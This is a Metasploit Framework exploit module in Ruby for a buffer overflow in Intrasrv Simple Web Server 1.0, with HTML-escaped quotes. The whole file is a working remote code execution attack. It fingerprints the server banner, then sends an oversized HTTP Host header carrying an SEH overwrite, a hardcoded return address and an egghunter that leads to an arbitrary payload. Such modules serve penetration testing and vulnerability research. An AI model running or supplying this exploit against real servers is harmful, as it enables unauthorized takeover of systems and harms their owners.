# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Egghunter

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Intrasrv 1.0 Buffer Overflow",
      &#039;Description&#039;    => %q{
        This module exploits a boundary condition error in Intrasrv Simple Web
        Server 1.0. The web interface does not validate the boundaries of an
        HTTP request string prior to copying the data to an insufficiently large
        buffer. Successful exploitation leads to arbitrary remote code execution
        in the context of the application.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;xis_one&#039;, # Discovery, PoC
          &#039;PsychoSpy <neinwechter[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;94097&#039;],
          [&#039;EDB&#039;,&#039;18397&#039;],
          [&#039;BID&#039;,&#039;60229&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 4660,
          &#039;StackAdjustment&#039; => -3500,
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "thread"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;v1.0 - XP / Win7&#039;,
            {
              &#039;Offset&#039; => 1553,
              &#039;Ret&#039;    => 0x004097dd #p/p/r - intrasrv.exe
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "May 30 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptPort.new(&#039;RPORT&#039;, [true, &#039;The remote port&#039;, 80])
        ], self.class)
  end

  def check
    begin
      connect
    rescue
      print_error("Could not connect to target!")
      return Exploit::CheckCode::Safe
    end
    sock.put("GET / HTTP/1.0\r\n\r\n")
    res = sock.get_once

    if res =~ /intrasrv 1.0/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # setup egghunter
    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, {
      :checksum=>true
    })

    # setup buffer
    buf = rand_text(target[&#039;Offset&#039;]-126)         # junk to egghunter at jmp -128
    buf << hunter                                 # egghunter
    buf << rand_text(target[&#039;Offset&#039;]-buf.length) # more junk to offset
    buf << "\xeb\x80" + rand_text(2)              # nseh - jmp -128 to egghunter
    buf << [target.ret].pack("V*")                # seh

    # second last byte of payload/egg gets corrupted - pad 2 bytes
    # so we don&#039;t corrupt the actual payload
    egg << rand_text(2)

    print_status("Sending buffer...")
    # Payload location is an issue, so we&#039;re using the tcp mixin
    # instead of HttpClient here to maximize control over what&#039;s sent.
    # (i.e. no additional headers to mess with the stack)
    connect
    sock.put("GET / HTTP/1.0\r\nHost: #{buf}\r\n\r\n#{egg}\r\n\r\n")
    disconnect
  end
end

